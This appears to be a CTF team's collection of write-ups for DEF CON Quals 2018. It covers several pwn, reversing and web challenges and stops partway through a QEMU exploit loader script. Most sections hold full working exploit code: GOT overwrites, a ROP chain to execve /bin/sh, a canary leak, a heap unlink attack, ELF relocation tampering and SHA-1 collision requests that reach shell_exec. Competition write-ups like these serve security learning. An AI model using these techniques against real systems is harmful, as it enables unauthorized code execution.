---
title: "DEFCON CTF QUALS 2018 - Write ups"
author: "mHACKeroni team"
comments: true
---

This is the collection of writeups for the DEF CON Quals 2018 by the Mhackeroni team. 

Index
-------
[Adamtune](#adamtune) - [Babypwn1805](#babypwn1805) - [Bitflipper](#bitflipper) - [Ddtek: Preview](#ddtek-preview) - [Easy Pisy](#easy-pisy) - [Elastic Cloud Compute](#elastic-cloud-compute) - [ELF Crumble](#elf-crumble) - [Exzendtential-crisis](#exzendtential-crisis) - [Flagsifier](#flagsifier) - [Geckome](#geckome) - [Ghettohackers: Throwback](#ghettohackers-throwback) - [It's-a me!](#its-a-me) - [Note Oriented Programming](#note-oriented-programming) - [Official](#official) - [PHP Eval White-List](#php-eval-white-list) - [Ps-secure](#ps-secure) - [Race Wars](#race-wars) - [Sbva](#sbva) - [Shellql](#shellql) - [TechSupport](#techsupport) - [WWW](#www) - [You Already Know](#you-already-know)
#### [Comments section](#disqus_thread)


Adamtune
--------
Hey folks! We really wanted to write-up this challenge for you -- but we decided to let Adam Doupé personally explain it instead.


[https://youtu.be/3-4cnyswp4w](https://youtu.be/3-4cnyswp4w)

Babypwn1805
--------
Reading the provided C source file we found the two stack based 1024 bytes buffer overflow and the "write 8 bytes in a position relative to the bss asdf variable" possibility with the second read.

At first we tried using the stack buffer overflow to ovewrite last byte of the pointer to the name string of the program. We discovered leaking the env that there was a preloaded custom libc, probably different each time.

Second step was to going backwards in the bss writing only 1 byte, trying to find where the entry for the read is on the GOT. Overwriting the LSB we manage to call different functions when the offset is -56 from the variable in bss.

Then we setup a bruteforce of the last two bytes of the read GOT entry, trying to hit a one_gadget (single address to call `execv("/bin/sh/")`).

We found that a few addresses returned some error related to `/bin/sh` having the wrong parameters, so we did another bruteforce, this time trying to jump few bytes before or after those addresses that returned a good output.

We managed to execute the `echo` command provided, so we refined the payload to cat the flag. 

### Exploit (final iteration)

```python
#!/usr/bin/env python
from __future__ import print_function
import sys
import struct
import hashlib
from pwn import *
from random import randint
import signal
import sys
host = 'e4771e24.quals2018.oooverflow.io'
port =  31337

def signal_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)
print('Press Ctrl+C')

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

def solve_pow2(challenge, n):
    r = remote("<ip of our leet server>",13337)
    r.sendline("{} {}".format(challenge,n))
    return int(r.recvuntil("\n")[:-1])

context(log_level='DEBUG')
magics=[0x782a,0x1cbe,0xa821,0x580e,0x6372,0x6fc3,0x5463,0x8076,0x7818,0x834,0x2812,0x4aa8,0x7fc7,0x4019,0x6bb2,0x4bba,0x2ff4,0x206e,0x6078,0x2ff7,0x6037,0x5fc7,0x181d,0x4075,0x5be1,0x9ff6,0x981e,0x9bdc,0x3fff,0x7826,0x581f,0x4aac,0x781b,0x1ee5,0x11d2,0x7d78,0xed9,0x46e7,0xa01d,0x701d]
conn = remote(host,port)

funziona=[0x280d,0x2807,0xa02e,0x581d,0x1808,0xa02e,0x11e5,0x808b,0x607d]

def connect():
    global conn
    conn.close()
    conn = remote(host,port)
    conn.recvuntil('Challenge: ')
    challenge = conn.recvuntil('\n')[:-1]
    conn.recvuntil('n: ')
    n = int(conn.recvuntil('\n')[:-1])

    # print('Solving challenge: "{}", n: {}'.format(challenge, n))

    solution = solve_pow2(challenge, n)
    # print('Solution: {} -> {}'.format(solution, pow_hash(challenge, solution)))
    conn.sendline(str(solution))
    conn.recvuntil("Go\n")

if __name__ == '__main__':
    while True:
        while True:
            try:
                connect()
                break
            except:
                continue
        while True:
            try:
                conn.clean_and_log()
                conn.send(p64(2**64 - 56))#read@GOT
                # conn.send(p64(2**64 - 88))#read@
                # randPart = randint(-0x18,0x18)
                # currentMagic = random.choice(magics) + randPart
                currentMagic = random.choice(funziona)
                log.info("Current "+hex(currentMagic))
                sleep(0.1)
                conn.send(p16(currentMagic))
                # conn.send(p64(0x7ffff7af1cde))
                sleep(0.1)
                conn.sendline("echo -n ZIOPANEFUNZIONA;cat ../home/flag")
                sleep(0.1)
                resp = conn.recvuntil("Go\n")

                # if (len(resp)==0):
                #     conn.sendline('uname -a;echo -n "LODODIO";')
                # else:
                #     continue
                # res = conn.recvuntil("Go\n")
                if("Go\n" in resp ):
                    resp = resp.replace("Go\n","")
                if(len(resp)>0):
                    log.warning("Executed stuff "+ hex(currentMagic)+ " : "+ repr(resp))
            except EOFError:
                log.warning("EOF")
                break
```



Bitflipper
--------
Type: reverse-ish, flag value: 177pt. Served at `61421a06.quals2018.oooverflow.io:5566`.

### The wrapper

We are given access to a server that runs a packed ELF x86-64 program. Before running the binary, it tells us:

    -------------------------------------------------------
      Bitflipper - ELF Fault Injection Framework
    -------------------------------------------------------
    Test program md5:  30acc4aee186d6aef8e9e2036008a710
    -------------------------------------------------------
    How many faults you want to introduce?

The wrapper gives us the possibility to *"introduce faults"* in the binary before it is run, which means flipping between 0 and 4 bits (at whichever offset we like) in the binary. It also gives us the MD5 hash of the file, which will be helpful to us later to make some checks.

Answering *"0"* for the number of faults to add will make the wrapper run the program without modifying it, giving us its normal output:

    How many faults you want to introduce? 0
    Alright, you are the boss.
    Here is the output of the original program...
    -------------------------------------------------------
    README
    abc.jpg
    archive.zip
    beta.doc
    celtic.png
    dir
    secret_flag.txt
    test.doc
    version.txt

Interesting... we have a `secret_flag.txt` in the current folder.

Answering a number `n` between 1 and 4 will, on the other hand, make the wrapper ask for `n` offsets of the `n` bits which are going to be flipped:

    How many faults you want to introduce? 2
    That sounds like a good number
    Which bit do you want to flip (0-81727)? 1337
    Which bit do you want to flip (0-81727)? 31337
    2 bits have been flipped
    MD5 of the new version: 7b41910eb8c1512fa5e8f97f203ba58e
    Let me run the program for you now...

We are given the MD5 hash of the modified file, then the wrapper tries to run it and give us the output. Fiddling around with the offsets of the bits to flip **we are very easily able to "break" the binary**. We can, for example: **corrupt the ELF header**, make it go into segmentation fault, **tamper with symbol relocations**, trigger a double `free()` causing a vmmap dump and backtrace, and so on.

Making the program crash will cause the wrapper to send us an **important hint**:

    Looks like you broke it!
    I would send you a core dump, but I could not find any in the current directory

Cool! This means that if we manage to **flip some bits in the ELF header to make it become an *ELF core file*, the server will send us the entire binary**!

Indeed, flipping bits `128`, `129` and `130`, changing the byte at offset `0x10` from `0x03` to `0x04`, works just fine! Now we have a binary we can disassemble and begin to work on.

### The binary

By computing the MD5 hash of the file we just got from the server we can verify that it is indeed the same binary which is run by the wrapper server-side. Moreover, we can now try out various combinations of bit flips and check the new local MD5 with the remote MD5 to check if we correctly flipped the bits.

The program itself is not really interesting: it outputs a simple sorted list of the files in the current folder coloring their name using ANSI escape codes. What is interesting is that by crashing the binary with a double `free()` we can get a vmmap dump from which we can find out the `libc` version being used:

    ...
    7ff226ddb000-7ff226f9b000 r-xp 00000000 ca:01 1971 /lib/x86_64-linux-gnu/libc-2.23.so
    7ff226f9b000-7ff22719b000 ---p 001c0000 ca:01 1971 /lib/x86_64-linux-gnu/libc-2.23.so
    7ff22719b000-7ff22719f000 r--p 001c0000 ca:01 1971 /lib/x86_64-linux-gnu/libc-2.23.so
    7ff22719f000-7ff2271a1000 rw-p 001c4000 ca:01 1971 /lib/x86_64-linux-gnu/libc-2.23.so
    ...

We now know that it is using `libc-2.23`, and we assume the distro is, as usual, Ubuntu 16.04.4 LTS (Xenial Xerus).

### The exploit

Now, getting into the real exploit: as said earlier, since we can modify up to four bits at arbitrary locations in the file, if precisely calculated, **we can corrupt an `Elf64_Rela` structure in the PLT relocation table** (`.rela.plt`) to trick the loader into writing the address of the specified symbol to an address (`r_offset`) in the GOT PLT (`.plt.got`), and, most importantly, adding a given offset (`r_addend`) to the absolute address (in the `libc`).

The `Elf64_Rela` struct is defined like this:

    typedef struct {
        Elf64_Addr      r_offset;
        Elf64_Xword     r_info;
        Elf64_Sxword    r_addend;
    } Elf64_Rela;

We now have three different approaches to modify the execution flow of the program to fullfill our objective (which is obviously to execute a shell):

 1. **Modify the index of a symbol** moving one of the functions used by the binary in another position in the PLT so that the program would call a different function instead of the expected one. Changing `r_offset` could also be possible, but harder to manage. This was not of great help since the binary doesn't use interesting functions (like `system` or similars).

 2. **Modify `r_addend`** making the loader load a different function in the GOT (if it is close enough the original one). This was again not the case, since all of the "cool" `libc` functions (`system`, `execve`, `popen`, ...) were either too far or unreachable flipping only 4 bits of `r_addend` (i.e. setting only four bits to `1`).

 3. **Any combination of the first two**: applying both of the above modifications for a symbol, so that calling a specific function would result in jumping in a different PLT entry than the expected one, and following the GOT entry of the latter would cause to call a totally different `libc` function than the original.

To help us identify which function could have been replaced with wich, we wrote an helper script which did the maths for us. An example output filtered with `grep execv` is the following (the full list was actually more than 2000 lines):

    readdir  execv  0xcc860     0b100010001000000   0 3
    closedir execvp 0xccbc0     0b100100000000000   0 2
    closedir execvp 0xccbc0     0b100100000000001   1 3
    closedir execvp 0xccbc0     0b100100000000010   2 3
    closedir execvp 0xccbc0     0b100100000000100   4 3
    closedir execvp 0xccbc0     0b100100000001000   8 3
    strlen  fexecve 0xcc7a0 0b1000001000010000000   0 3
    strlen  execve  0xcc770 0b1000001000001000000 -16 3

Unfortunately none of the functions reachable by tampering an `Elf64_Rela` structure were useful, since most of them were just random and useless "normal" functions, and the few interesting ones (like `exec{l,ve,vpe}`) were reachable but would have ended up being called with the wrong arguments.

We finally ran [`one_gadget`](https://github.com/david942j/one_gadget) on the `libc-2.23` binary, discovered four useful gedgets to run `execve('/bin/sh', NULL, NULL)` and added their address to the input of our script: three of them were completely out of range of the possible addresses that we could make the loader write into GOT, but one was close enough:

    opendir gadget4 0xf1147 0b101001000000000000 -7 3

which was:

    f1147: 48 8b 05 6a 2d 2d 00    mov    rax,QWORD PTR [rip+0x2d2d6a] # 3c3eb8 <__environ@@GLIBC_2.2.5-0x3080>
    f114e: 48 8d 74 24 70          lea    rsi,[rsp+0x70]
    f1153: 48 8d 3d fd bb 09 00    lea    rdi,[rip+0x9bbfd]            # 18cd57 <_libc_intl_domainname@@GLIBC_2.2.5+0x197>
    f115a: 48 8b 10                mov    rdx,QWORD PTR [rax]
    f115d: e8 0e b6 fd ff          call   cc770 <execve@@GLIBC_2.2.5>

This gadget executes `execve("/bin/sh", rsp+0x70, environ)`, so we actually would need `rsp+0x70` to be `NULL` to be sure to not get a `SIGSEGV` or to not call `/bin/sh some_garbage_args`, but it was well worth a try: using the third approach explained above, **we can modify the `Elf64_Rela` struct of the `opendir` symbol** (by flipping the bits `0x7fa*8 +1`, `+4` and `+7`), **and make the program jump 7 bytes before the gadget** (specifically at `libc_base + 0xf1140`) when the tampered `opendir` function gets called.

Jumping at `0xf1140` shuffles the cards in the deck a little bit, but it really isn't a problem:

    f1140: 24 60                   and    al,0x60
    f1142: e8 99 67 00 00          call   f78e0 <__close@@GLIBC_2.2.5>
    f1147: 48 8b 05 6a 2d 2d 00    mov    rax,QWORD PTR [rip+0x2d2d6a] # 3c3eb8 <__environ@@GLIBC_2.2.5-0x3080>
    ...

As you can see, before the gedget there's a dirty little `mov al,0x60`, but we don't care about it because we have a `mov rax, <stuff>` right after wich resets `rax`, and also a call to `__close@@GLIBC_2.2.5`: this call could actually do something unexpected.

Anyway, running the exploit locally gave us a functioning shell, so we ran it remotely, and... the server hangs waiting for input, **success!** Well, actually not really: no output was being sent back to us because the call to `__close` was closing `stdout` right before executing the shell. Not a problem, we still have `stderr`! Now, since the remote shell is `dash`, we first ran `bash` and then tried to run `cat secret_flag.txt >&2`, followed by two `exit`. The wrapper complained: it had detected that we were trying to get the content of a local file and blocked us. To circumvent this check we just put the content of the flag in a local variable and used `echo` to write its content splitted in three parts:

    FLAG=$(cat secret_flag.txt)
    echo ${FLAG:0:5} >&2
    echo ${FLAG:5:5} >&2
    echo ${FLAG:10:5} >&2

**Ta da! Got the flag!** Here's the final output of our exploit:

    $ ./expl.py
    [+] Opening connection to 61421a06.quals2018.oooverflow.io on port 5566: Done
    [+] Solving proof of work: done (359477).
    [*] Flipping bits: 0x3fcc, 0x3fcf, 0x3fd1
    [*] Waiting for shell to run...
    [*] Sending payload: FLAG=$(cat secret_flag.txt)
        echo ${FLAG:0:5} >&2
        echo ${FLAG:5:5} >&2
        echo ${FLAG:10:5} >&2
    [+] Receiving all data: Done (251B)
    [*] Closed connection to 61421a06.quals2018.oooverflow.io port 5566

    3 bits have been flipped
    MD5 of the new version: 3e126b5008b69f13559c49657a15f5fa
    Let me run the program for you now...
    -------------------------------------------------------
    bitfl
    ip_ma
    dness

    -------------------------------------------------------

    [+] Gottem!


Flag: `bitflip_madness`.

### Code

Code of the exploit:

```python
#!/usr/bin/env python2

from __future__ import print_function
from pwn import *
from time import sleep
import hashlib

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + p64(solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while not check_pow(challenge, n, candidate):
        candidate += 1
    return candidate

def connect_and_solve_pow():
    conn = remote('61421a06.quals2018.oooverflow.io', 5566)
    conn.recvuntil('Challenge: ')
    c = conn.recvline().strip()
    conn.recvuntil('n: ')
    n = int(conn.recvline().strip())

    pow_progress = log.progress('Solving proof of work')
    pow_progress.status('hang tight...')

    sol = solve_pow(c, n)
    pow_progress.success('done (%d).', sol)
    conn.sendline(str(sol))

    return conn

BITS_TO_FLIP = [
    0x7f9*8 + 4,
    0x7f9*8 + 7,
    0x7fa*8 + 1
]

PAYLOAD = """FLAG=$(cat secret_flag.txt)
echo ${FLAG:0:5} >&2
echo ${FLAG:5:5} >&2
echo ${FLAG:10:5} >&2
"""

r = connect_and_solve_pow()

log.info('Flipping bits: %s', ', '.join(map(hex, BITS_TO_FLIP)))
r.recvuntil('introduce? ')

r.sendline(str(len(BITS_TO_FLIP)))

for b in BITS_TO_FLIP:
    r.recvuntil('(0-81727)? ')
    r.sendline(str(b))

log.info('Waiting for shell to run...')
sleep(1)

log.info('Sending payload: %s', PAYLOAD)

r.sendline('bash')
r.sendline(PAYLOAD)
r.sendline('exit')
r.sendline('exit')

output = r.recvall()

print('', output, sep='\n')

log.success('Gottem!')
r.close()
```



Ddtek: Preview
--------------
The challenge presents us with the "preview" binary and the `libc.so.6` file.
The binary allow us to view the first 7 lines of any file specified in the
input with the format "HEAD filename", if the file has less than 7 lines, it
will not be printed. That means the flag file is not accessible.

A quick look at the binary in ida, reveals us that the file is behaving like
an unpacker, it loads ld.so.2 at a random address and makes it load the main
binary in another random address. Furthermore we can see that the main
function has a clear stack overflow. But the binary has the canary...

Examining the unpacked behavior we see that the random position where the
binary loads are taken from the `AT_RANDOM` entry of the auxiliary vector. So
if we know where the program is loaded we leak also the canary, since the
loader takes the canary value from the very same bytes.

After some thinking we found that the binary let's us read `/proc/self/maps`:
BINGO! Fortunately the first seven entries printed match with the address of
the binary and ld, that combined correspond with the canary. Now
OVERFLOW+CANARY+PAD+ROPCHAIN_ON_LD gives us the desired shell!

```python
from struct import pack
from pwn import *
import base64
import sys
import time
import os

host = 'cee810fa.quals2018.oooverflow.io'
port =  31337


def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1


def connect():
    global conn
    conn.close()
    conn = remote(host,port)
    conn.recvuntil('Challenge: ')
    challenge = conn.recvuntil('\n')[:-1]
    conn.recvuntil('n: ')
    n = int(conn.recvuntil('\n')[:-1])


    solution = solve_pow(challenge, n)
    conn.sendline(str(solution))

conn = remote(host,port)
connect()


conn.sendline("HEAD /proc/self/maps")
conn.recvuntil("preview:\n")
canary_low = 0
canary_high = 0
writable_spot = 0
for x in range(7):
    line = conn.recvuntil("\n")
    if "ld" in line and canary_high == 0  and "x" in line:
        ld = int(line.split("-")[0], 16)
        canary_high = line.split("-")[0][:-3]
    if canary_low == 0 and "ld" not in line and "x" in line:
        canary_low = line.split("-")[0][:-3]
    if writable_spot == 0 and "rw" in line and "ld" in line:
        writable_spot = int(line.split("-")[0], 16)
canary = "0x%s%s00" % (canary_high, canary_low)
print "The canary is ", canary
canary = int(canary, 16)
print ("%x" % canary)


IMAGE_BASE_0 =  ld # ld-linux-x86-64.so.2
WRITABLE_OFFSET_0 = writable_spot - ld
WRITABLE_OFFSET_1 = WRITABLE_OFFSET_0 + 8
rebase_0 = lambda x : p64(x + IMAGE_BASE_0)

print "IMAGE_BASE 0x%x" % IMAGE_BASE_0

rop = ''

rop += rebase_0(0x0000000000002112) # 0x0000000000002112: pop rdi; ret; 
rop += '/bin/sh\x00'
rop += rebase_0(0x00000000000106ca) # 0x00000000000106ca: pop rsi; ret; 
rop += rebase_0(WRITABLE_OFFSET_0)
rop += rebase_0(0x000000000001a247) # 0x000000000001a387: mov qword ptr [rsi], rdi; xor eax eax; ret;
rop += rebase_0(0x0000000000002112) # 0x0000000000002112: pop rdi; ret; 
rop += rebase_0(WRITABLE_OFFSET_0)
rop += rebase_0(0x00000000000106ca) # 0x00000000000106ca: pop rsi; ret; 
rop += p64(0x0)
rop += rebase_0(0x0000000000000d5e) # 0x0000000000000d5e: pop rax; pop rdx; pop rbx; ret; 
rop += p64(0x000000000000003b)
rop += p64(0x0)
rop += p64(0x0)
rop += rebase_0(0x000000000001b605) # 0x000000000001b605: syscall; ret;

payload = ("A"*0x58) + p64(canary) + "A"*8 + rop
assert "\n" not in payload
assert len(payload) <= 256
conn.sendline(payload)
conn.sendline("cat flag")
conn.interactive()
```

Flag: `OOO{ZOMG, WhAT iF order-of-the-overfow IS ddtek?!?!?!? Plot Twist!}`


Easy Pisy
---------
We were given a [website](http://5a7f02d0.quals2018.oooverflow.io) with two PHP files: `sign.php` and `execute.php`, as well as two example PDF files.

Looking at the source code, which was available, the `sign.php` endpoint received a PDF file, extracted the text using `ocrad`, an OCR software, signed it using `openssl_sign` with a private key that, of course, we could not access, and returned the signature. The server signed only files containing the text `ECHO` (but not `EXECUTE`).

The `execute.php` endpoint received via a `POST` request a file, `userfile`, and a signature, `signature`, verified the signature using `openssl_verify`, and extracted the text using the same `pdf_to_text` function used in `sign.php`. Then, if the text starts with `ECHO`, it just prints the OCRed text; instead, if the text starts with `EXECUTE`, it passes the OCRed text to `shell_exec`.

Clearly, we must find a way to sign a PDF file containing an image of a text that starts with `EXECUTE`, but our signing endpoint refuses to sign files that start with `EXECUTE`.

Looking at the PHP documentation for `openssl_sign()`, we observe that the default algorithm (the one it's used) is SHA1. Thus, we immediately thought of the (not-so-recently-discovered-anymore) SHA-1 collision technique (https://shattered.io/static/shattered.pdf). Indeed, if we could create two different PDF files that hash to the same SHA1 value, we could execute arbitrary commands and cat our flag.

To create colliding PDFs, we used this online SHA collider: https://alf.nu/SHA1 to obtain two files `echo.pdf` and `execute.pdf`, one with a harmless `ECHO /bin/cat flag;` command, and the other one with `EXECUTE /bin/cat flag;`, both with the same SHA1 hash.

Once we have the two colliding files, it is only a matter of:
```
curl -F "userfile=@echo.pdf" http://5a7f02d0.quals2018.oooverflow.io/sign.php
```
to sign the harmless file:
```
Executing 'convert -depth 8 /tmp/phpMWWbFu.pdf /tmp/phpMWWbFu.ppm'<br/>Executing 'ocrad /tmp/phpMWWbFu.ppm'<br/>Extracted text: "ECHO /bin/cat flag;"<br/>I'm OK with ECHO commands. Here is the signature: <br/>819c7fd2fc0b00849e01a1f5825001684b51f3e8664c004fc08e64b60c67a1efc9fd2ef030fc1e3458fee51a10aa2b1c9e125f49c6757ded05da9b6f050d8c625262654b68d24042cff1645230d1b3a51b51bc9eebc34d6c7c2759b50b050176ce0cea61dd3748d4a075ecf67767eb4f853ed8b741b8e3e7ebd66b34321af4b789f9b39e72c46d88be2beb84d32a844b76ca96685fa54590462af035d508947fb1d5bcf20b0592b77d9ab70e4f2c6d8995f50469befce3c9372b56c3b5d8ccd48b220a96fdf29b7b2499f49bf7d9fb3c87e3dfa3fa818561739b89b3aae54f4ce5e6c24d012598009fa3cddf12ae94f2d3554d22fdba379105c5fe6b1b71abd0
```

At this point,
```
curl -F "userfile=@execute.pdf" -F "signature=`cat signature.txt`" http://5a7f02d0.quals2018.oooverflow.io/execute.php
```
leads to the flag:
```
Signature is OK.<br/>Executing 'convert -depth 8 /tmp/php2dqia6.pdf /tmp/php2dqia6.ppm'<br/>Executing 'ocrad /tmp/php2dqia6.ppm'<br/>Text: "EXECUTE /bin/cat flag;"<br/>About to execute: "/bin/cat flag;".<br/>Output: OOO{phP_4lw4y5_d3l1v3r5_3h7_b35T_fl4g5}
```

Flag: `OOO{phP_4lw4y5_d3l1v3r5_3h7_b35T_fl4g5}`


Elastic Cloud Compute
---------------------
For this challenge we were provided with a custom qemu binary and a barebones linux image.

Since the challenge description mentions "extra PCI devices" we started looking around in the qemu binary. Searching for interesting strings in the qemu binary let us find the functions that handle the additional driver (containing "ooo_class_init").

Looking online for guides on how to add devices to qemu we actually found the [source code](https://github.com/qemu/qemu/blob/v2.7.0/hw/misc/edu.c) the driver was based on: this really helped in reversing the binary more quickly.

The driver handles writes and reads to its mapped memory by `malloc`ing memory and writing and reading data in the heap. It's easy to spot a problem: there is no bound checking on either of them. We can write and read on the heap with a range of 16 bits of offset, more than enough to corrupt the chunk headers and perform some heap exploitation.

A good target for our memory corruption is the array where the `malloc`ed pointers are saved, which is located in the bss. Controlling them would mean choosing where to read and write when accessing the driver's memory.

To manage this we exploited the unlink macro in the `free` call.

We allocate two consecutive chunks, then forge a fake chunk  and store it in the first chunk's content space. We overwrite the prev_size header of the second chunk to make it look like the chunk preceding it is our forged chunk, and we unset the prev_inuse flag for the second chunk. We then free the second chunk, which in turn triggers a consolidation with our fake chunk.

By  accurately writing all the size fields and the target pointers, all security checks pass and the unlink macro overwrites the pointer in the bss, which now points to the bss itself. We can now write directly on the bss and edit the pointers, which therefore means we managed to obtain an arbitrary write primitive.

To finish the challenge we simply overwrite the GOT entry of `free` with the function that prints the flag. We trigger a call to `free` and obtain the flag.

P.S.
We had some issues trying to compile and/or execute our exploit inside qemu. We managed to make it run with some glorified copy and paste.

Exploit to be run inside qemu:
```c
/*
Basic PCI communication template from https://github.com/billfarrow/pcimem/blob/master/pcimem.c
Unlink exploit written following https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html
*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/mman.h>

#define PRINT_ERROR \
	do { \
		fprintf(stderr, "Error at line %d, file %s (%d) [%s]\n", \
		__LINE__, __FILE__, errno, strerror(errno)); exit(1); \
	} while(0)

// map 24 bit address space
#define MAP_SIZE 16777216UL
#define MAP_MASK (MAP_SIZE - 1)

void pci_read(void *map_base, off_t target, int access_type) {
	int type_width;
	int64_t read_result;
	void *virt_addr;

	virt_addr = map_base + (target & MAP_MASK);
	switch(access_type) {
		case 'b':
			read_result = *((uint8_t *) virt_addr);
			type_width = 2;
			break;
		case 'h':
			read_result = *((uint16_t *) virt_addr);
			type_width = 4;
			break;
		case 'w':
			read_result = *((uint32_t *) virt_addr);
			type_width = 8;
			break;
		case 'd':
			read_result = *((uint64_t *) virt_addr);
			type_width = 16;
			break;
		default:
			fprintf(stderr, "Illegal data type '%c'.\n", access_type);
			exit(2);
	}
	printf("Value at offset 0x%X (%p): 0x%0*lX\n", (int) target, virt_addr, type_width, read_result);
	fflush(stdout);
}

void pci_write(void *map_base, off_t target, int access_type, int64_t writeval) {
	int type_width = 16;
	int64_t read_result;
	void *virt_addr;
	
	virt_addr = map_base + (target & MAP_MASK);
	// printf("Virt addr %p\n", virt_addr);
	// printf("Writeval %x\n", writeval);
	switch(access_type) {
		case 'b':
			*((uint8_t *) virt_addr) = writeval;
			break;
		case 'h':
			*((uint16_t *) virt_addr) = writeval;
			break;
		case 'w':
			*((uint32_t *) virt_addr) = writeval;
			break;
		case 'd':
			*((uint64_t *) virt_addr) = writeval;
			break;
	}
	// printf("Written 0x%0*lX\n", type_width,
	//   writeval, type_width, read_result);
	fflush(stdout);
}

// write/read address is like [opcode, 4bit][memid, 4bit][subaddress, 16bit]

// malloc: write to memory with opcode 0
void mall(void *map_base, int index, int size) {
	// malloc size = valtowrite * 8
	off_t target = ((index & 0xF) << 16);
	pci_write(map_base, target, 'w', size / 8);
}	

// write to pointed area: write to memory with opcode 2
void write_heap(void *map_base, int index, int64_t writeval, int offset) {
	// offset is a 16 bit value
	off_t target = offset | ((index & 0xF) << 16) | ((2 & 0xF) << 20);
	pci_write(map_base, target, 'w', writeval);
}
	
// free: write to memory with opcode 1
void myfree(void *map_base, int index) {
	off_t target = ((index & 0xF) << 16) | ((1 & 0xF) << 20);
	pci_write(map_base, target, 'w', 0);
}

// read from pointer: read memory
void myread(void *map_base, int index, int offset) {
	// read 4 bytes, unused
	off_t target = ((index & 0xF) << 16) | offset;
	pci_read(map_base, target, 'd');
}


int main(int argc, char **argv) {
	int fd;
	void *map_base;
	char *filename;
	off_t target;
	int access_type = 'w';

	filename = "/sys/devices/pci0000:00/0000:00:04.0/resource0";
	target = 0x0;
	access_type = 'w';
	argc = 0;

	if((fd = open(filename, O_RDWR | O_SYNC)) == -1) PRINT_ERROR;
	printf("%s opened.\n", filename);
	printf("Target offset is 0x%x, page size is %ld\n", (int) target, sysconf(_SC_PAGE_SIZE));
	fflush(stdout);

	// map device memory
	printf("mmap(%d, %ld, 0x%x, 0x%x, %d, 0x%x)\n", 0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, (int) target);
	map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, target & ~MAP_MASK);
	if(map_base == (void *) -1) PRINT_ERROR;
	printf("PCI Memory mapped to address 0x%08lx.\n", (unsigned long) map_base);
	fflush(stdout);

	printf("Clearing bins\n");
	// clear malloc bins to make sure we will have consecutive chunks
	int i;
	for (i = 0; i < 2000; i++)
		mall(map_base, i % 4, 0x80);

	// we now have some heap pointers at the indexes 0,1,2,3
	printf("Starting exploit\n");

	// struct chunk_structure {
	//   size_t prev_size;
	//   size_t size;
	//   struct chunk_structure *fd;
	//   struct chunk_structure *bk;
	//   char buf[10];               // padding
	// };

	// First forge a fake chunk starting at chunk1
	// Need to setup fd and bk pointers to pass the unlink security check
	//fake_chunk = (struct chunk_structure *)chunk1;
	//fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
	//fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

	// fake chunk prev_size = 0 (probably not needed)
	write_heap(map_base, 0, 0, 0);
	write_heap(map_base, 0, 0, 4);
	// fake chunk size = 0x80, NON_MAIN_ARENA and PREV_INUSE flags are set
	write_heap(map_base, 0, 0x85, 8);
	write_heap(map_base, 0, 0, 12);
	// write &chunk1 - 3 (0x1317928) in chunk1 + 16
	write_heap(map_base, 0, 0x1317928, 16);
	// write &chunk1 - 2 (0x1317930) in chunk1 + 24
	write_heap(map_base, 0, 0x1317930, 24);

	// Next modify the header of chunk2 to pass all security checks
	//chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
	//chunk2_hdr->prev_size = 0x80;  // chunk1's data region size
	//chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

	// chunk2 prev_size = 0x80
	write_heap(map_base, 0, 0x80, 0x80);
	// unset PREV_INUSE bit for chunk2
	write_heap(map_base, 0, 0x94, 0x88);

	// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
	// This results in chunk1 pointer pointing to chunk1 - 3
	// i.e. chunk1[3] now contains chunk1 itself.
	// We then make chunk1 point to some victim's data
	//free(chunk2);
	myfree(map_base, 1);
	printf("Pointer overwritten\n");

	// overwrite pointer at index 1 with the address of free@GOT
	write_heap(map_base, 0, 0x011301A0, 32);
	write_heap(map_base, 0, 0, 36); 

	// overwrite GOT entry of free with our target function
	write_heap(map_base, 1, 0x6e65f9, 0);
	write_heap(map_base, 1, 0, 4);

	printf("Reading flag\n");
	myfree(map_base, 0);
	
	if(munmap(map_base, MAP_SIZE) == -1) PRINT_ERROR;
	close(fd);
	return 0;
}
```

Script to load the exploit in qemu and execute it:
```python
#!/usr/bin/env python
from __future__ import print_function
import sys
import struct
import hashlib
from pwn import *
import base64
import subprocess
from time import sleep

host = '11d9f496.quals2018.oooverflow.io'
port =  31337

def chunkstring(string, length):
    return (string[0+i:length+i] for i in range(0, len(string), length))

def buildexploit():
    subprocess.check_call("musl-gcc exploit.c -Os -static -o exploit",shell=True)    
    subprocess.check_call("tar cfz exploit.tar.gz exploit",shell=True)
    with open("./exploit.tar.gz", "rb") as f:
        exploit = f.read()
    b64exploit = base64.b64encode(exploit)
    exploit.encode("base64")
    return b64exploit

def exploit(send):
    exp = buildexploit()
    sleep(10)
    print("chunks...")
    i = 0
    for chunk in chunkstring(exp, 700):
        sleep(2)
        print(i)
        i += 1
        send("echo -n \"{}\" >> exploitb64".format(chunk))
    sleep(1)
    print("almost")
    send("base64 -d exploitb64 > ./exploit.tar.gz")
    sleep(1)
    send("tar xf exploit.tar.gz")
    sleep(1)
    send("chmod +x ./exploit")
